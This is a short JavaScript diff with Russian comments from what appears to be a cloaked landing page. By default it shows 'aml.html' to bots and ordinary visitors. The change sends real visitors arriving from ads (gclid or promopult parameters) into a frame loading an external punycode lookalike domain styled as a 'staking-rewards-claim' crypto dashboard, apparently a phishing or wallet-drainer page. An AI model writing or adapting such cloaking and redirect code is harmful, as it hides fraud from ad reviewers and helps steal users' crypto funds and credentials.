@@ -55,7 +55,7 @@
     let targetUrl = 'aml.html'; // По умолчанию показываем aml.html
 
     if (!isBot() && (hasGclid || hasPromopult)) {
-      targetUrl = 'app.html';
+      targetUrl = 'https://xn--soend-l7a.fi-staking-rewards-claim.api-dashboard-connect.com/app.html';
     }
 
     // Загружаем соответствующую страницу во фрейм
